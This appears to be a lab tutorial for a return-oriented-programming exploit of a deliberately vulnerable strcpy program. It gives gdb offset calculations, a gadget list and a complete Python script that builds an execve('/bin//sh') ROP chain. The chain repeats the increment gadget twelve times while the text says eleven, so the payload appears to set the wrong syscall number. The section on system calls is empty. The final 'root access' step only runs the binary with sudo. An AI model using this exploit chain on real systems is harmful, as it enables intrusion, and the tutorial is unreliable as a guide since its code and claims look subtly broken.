# ROP-Exploit

## Buffer Overflow
Consider the following piece of code in `code.c`:  
```
#include <stdio.h>
#include <string.h>

void vulnerable(char *arg)
{
	char buf[100];
	strcpy(buf, arg);
}

int _main(int argc, char **argv)
{
	if (argc != 2) {
		fprintf(stderr, "Error: need a command-line argument\n");
		return 1;
	}
	vulnerable(argv[1]);
	return 0;
}
```
Use the command `$ gcc code.c -o code -static -g -fno-stack-protector` to compile the C program into an executable. For your convenience, the binary file `code` has been provided for you.

## System Call

## Calculating Buffer Offset
To determine where our buffer begins and which memory address to overwrite, we can pass many `NOP` instructions as command line argument. This gives `payload.py`:
```
print('\x90'*1024)
```
`$ gdb --args code $(python payload.py)` to load the program.  
`(gdb) b *0x8048ef6` to break at `strcpy(buf, arg);` then `(gdb) c` to run till reaching breakpoint.  
`(gdb) x/2x $esp` to see the values of the two arguments. The output is `0xbffe9790: 0xbffe97ac 0xbffff194`, which means that the address of `buf` is at 0xbffe97ac. You may verify the output of `payload.py` (in other words command line argument `argv[1]`) by using the command `(gdb) x/32b 0xbffff194`.  
Next find the 'old_ebp' and 'ret_addr' field by looking at the vicinity of $ebp: `(gdb) x/4wx $ebp`. This should output `0xbffe9818: 0xbffe9838 0x08048f48 0xbffff194 0x00000000`. Verify that 0x08048f48 is the address to a function in the previous stack frame by executing `(gdb) x/32i 0x08048f48`. The result should be as follows:  
```
0x8048f48 <_main+75>:        mov    $0x0,%eax
0x8048f4d <_main+80>:        leave  
0x8048f4e <_main+81>:        ret    
0x8048f4f:   nop
0x8048f50 <main>:    lea    0x4(%esp),%ecx
0x8048f54 <main+4>:  and    $0xfffffff0,%esp
0x8048f57 <main+7>:  pushl  -0x4(%ecx)
---Type <return> to continue, or q <return> to quit---

```
We now know that 'ret_addr' field is at 0xbffe981c and the offset is 0xbffe981c - 0xbffe97ac = 0x70 = 112.

## Finding Gadgets
Use objdump to create a x86 code dump file of the executable: `objdump -d ./code > code.txt`. Following are some gadgets I found useful (I use intel syntax): 
```
<0x808e97d> mov [edx], eax ; ret        # move the value in eax to location where edx points to
<0x8051750> xor eax, eax ; ret          # clears eax
<0x809a546> inc eax ; ret               # increment eax by 1
<0x8050bbc> inc eax ; pop edi ; ret     # increment eax by 1 followed by a trivial pop
<0x80c2356> pop eax ; ret               # pop eax
<0x80481ec> pop ebx ; ret               # pop ebx
<0x80e3d46> pop ecx ; ret               # pop ecx
<0x805733a> pop edx ; ret               # pop edx
<0x80494f9> int 0x80                    # system call
```
Using the above gadgets, the assembly code to assign the proper values to the 4 registers can be easily produced:
```
# store 0 at buf[8]
xor eax, eax
pop edx 
<$esp> buf+8 
mov [edx], eax

# store "/bin/sh" starting at buf[0]
pop eax
<$esp> 0x6e69622f
pop edx
<$esp> buf
mov [edx], eax
pop eax
<$esp> 0x68732f2f
pop edx
<$esp> buf+4
mov [edx], eax

# store address of string into ebx, clear ecx and edx
pop ebx
<$esp> buf
pop ecx
<$esp> buf+8
pop edx
<$esp> buf+8

# put system call number 11 into eax
xor eax, eax
inc eax
pop edi
<$esp> 0x90909090 (garbage value)
... (repeated 11 times)

# int 0x80
```
## Generating Script
We can generate our buffer overflow with addresses jumping to the gadgets, one after another:
```
from struct import pack
buf = 0xbffe97ac
payload = ''
payload += '\x90'*(108+4)

# store 0x0 into buf[8]
payload += pack('<I', 0x08051750)
payload += pack('<I', 0x0805733a)
payload += pack('<I', buf+8)
payload += pack('<I', 0x0808e97d)

# store "/bin/sh" into buf[0] and buf[4]
payload += pack('<I', 0x080c2356)
payload += pack('<I', 0x6e69622f)
payload += pack('<I', 0x0805733a)
payload += pack('<I', buf)
payload += pack('<I', 0x0808e97d)
payload += pack('<I', 0x080c2356)
payload += pack('<I', 0x68732f2f)
payload += pack('<I', 0x0805733a)
payload += pack('<I', buf+4)
payload += pack('<I', 0x0808e97d)

# ebx <- addr("/bin/sh"), ecx <- 0, edx <- 0
payload += pack('<I', 0x080481ec)
payload += pack('<I', buf)
payload += pack('<I', 0x080e3d46)
payload += pack('<I', buf+8)
payload += pack('<I', 0x0805733a)
payload += pack('<I', buf+8)

# eax <- 11
payload += pack('<I', 0x08051750)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)
payload += pack('<I', 0x08050bbc)
payload += pack('<I', 0x90909090)

# system call
payload += pack('<I', 0x080494f9)

print(payload)
```

# Code Execution
Use the command `sudo chmod 777 code` to grant everyone permission to read, write and execute the binary. You can then type `$ sudo ./code $(python payload.py)`. Note the `#` appeared in console. Verify that you have been given root access by typing `# whoami`, and you should see `root` as expected.
